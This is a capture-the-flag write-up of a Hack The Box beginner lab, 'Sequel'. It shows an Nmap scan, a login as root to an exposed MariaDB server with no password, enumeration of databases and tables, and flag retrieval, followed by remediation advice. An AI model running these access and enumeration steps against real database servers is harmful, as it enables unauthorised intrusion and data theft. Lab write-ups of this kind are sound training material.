# Write-Up — Sequel: Passwordless Root MySQL Access to Flag Retrieval

> **Type:** Network / Database Penetration Test (HTB Starting Point)
> **Target:** `10.129.81.145` (`Sequel`)
> **Tools:** Nmap, mysql client
> **Final Result:** Unauthenticated root access to a MariaDB instance via a blank root password

---

## 1. Introduction

The target is a beginner-tier lab machine from Hack The Box's Starting Point track, running a directly exposed **MySQL/MariaDB** database service. The objective was to enumerate the host, connect to the database directly (bypassing any web application layer entirely), and retrieve a flag stored in one of its tables.

This box illustrates one of the most common database-layer findings:

- **Direct network exposure of a database service** with no application in front of it to mediate access.
- **A `root` account with no password set**, left over from what was likely a deployment/testing convenience and never locked down before going live.

---

## 2. Reconnaissance

### 2.1 Connectivity Check

```bash
ping 10.129.81.145
```

Successful replies confirmed the VPN tunnel was up and the target was reachable.

### 2.2 Port Scan — Nmap

```bash
nmap -sV -sC 10.129.81.145
```

Result:

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: FoundRows, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, SupportsCompression, SupportsTransactions, Speaks41ProtocolOld, ODBCClient, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, Support41Auth, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: Q_ir~DxN_q:j),@?X!99
|_  Auth Plugin Name: mysql_native_password
```

| Port | Service | Version |
|------|---------|---------|
| 3306/tcp | MySQL (MariaDB) | 5.5.5-10.3.27-MariaDB-0+deb10u1 |

Only a single port was found open (999 others closed/reset), making the database service itself the sole path forward — with no web application layer in front of it to enumerate or attack indirectly. The `-sC` script scan additionally fingerprinted the auth plugin (`mysql_native_password`) and protocol handshake details, confirming a standard MariaDB deployment with no unusual hardening visible from the banner alone.

---

## 3. Vulnerability Analysis

### 3.1 Identifying the Flaw

With the database reachable directly from the network, rather than searching for a version-specific MariaDB CVE, the service was tested for the most common database misconfiguration: **passwordless authentication on a privileged account**. It is common practice during deployment/testing to leave `root` without a password temporarily for ease of administration — a step that is sometimes never reverted before the service is exposed.

### 3.2 The Vulnerability

- **CVE:** N/A — this is a configuration weakness, not a software bug
- **Type:** Missing authentication on a privileged database account (blank root password)
- **Authentication:** Present as a mechanism, but bypassable with an empty credential
- **Impact:** Full administrative access to all databases and tables hosted on the server

---

## 4. Initial Access

### 4.1 Installing the Client

```bash
sudo apt update && sudo apt install mysql*
```

### 4.2 Connecting as Root

```bash
mysql -h 10.129.81.145 -u root
```

The connection was accepted with **no password prompt satisfied**, dropping directly into an interactive MySQL/MariaDB shell with root privileges.

### 4.3 Enumerating Databases

```sql
SHOW databases;
```

The `htb` database stood out as non-default and worth exploring further.

```sql
USE htb;
```

### 4.4 Enumerating Tables

```sql
SHOW tables;
```

Two tables were found:

```
config
users
```

### 4.5 Flag / Evidence

```sql
SELECT * FROM config;
```

This returned the lab's flag entry directly in the query output, submitted to the Starting Point page to mark the machine as complete.

> **Severity: Critical.** Unauthenticated root-level access to a database server directly reachable from the network — the most privileged account on the service required no credential at all.

---

## 5. Full Attack Chain

```
[ Recon: Nmap ]
       │
       ▼
[ MySQL/MariaDB (3306) directly exposed — no app layer in front ]
       │
       ▼
[ mysql -h [TARGET_IP] -u root → connects with no password ]
       │
       ▼
[ SHOW databases; → htb database identified ]
       │
       ▼
[ USE htb; SHOW tables; → config, users tables found ]
       │
       ▼
[ SELECT * FROM config; → flag retrieved ]
```

**Lesson:** No exploit, no credential cracking, and no web application vulnerability were involved at all. The entire compromise was: the database is directly reachable, and its most privileged account has no password.

---

## 6. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | `root` MySQL/MariaDB account with no password set | **Critical** | Set a strong password for `root` and all administrative accounts immediately after deployment (`ALTER USER 'root'@'%' IDENTIFIED BY '<strong password>';`); never leave privileged accounts passwordless in any environment reachable from a network. |
| 2 | Database service (3306) directly exposed to the network | **High** | Bind MySQL/MariaDB to `127.0.0.1` or an internal-only interface (`bind-address` in `my.cnf`) unless remote access is explicitly required; restrict via firewall to known application servers only, never expose directly to untrusted networks. |
| 3 | No least-privilege account separation observed (direct root access used for querying) | **Medium** | Create dedicated, least-privilege application accounts scoped to only the databases/tables they need, reserving `root` for administrative tasks performed from trusted hosts only. |
| 4 | Sensitive-sounding data (`config`, `users`) stored without observed encryption or access segmentation | **Medium** | Apply row/column-level access controls or application-layer encryption for sensitive fields; audit which accounts can read tables containing credentials or configuration secrets. |

---

## 7. Conclusion

This box is a compact illustration of a principle that applies directly to production database deployments:

1. **Deployment-time conveniences are the most common source of production misconfigurations.** A blank root password made sense during initial setup — the failure was in never revisiting it before exposure.
2. **Direct database exposure removes every protective layer a web application would normally provide.** Input validation, authentication flows, and access control at the application tier mean nothing if the database itself is reachable and open.

The fix, as with most findings of this class, is operational discipline: set a password on every privileged account before the service goes live, and never expose a database directly to a network that doesn't strictly need it.
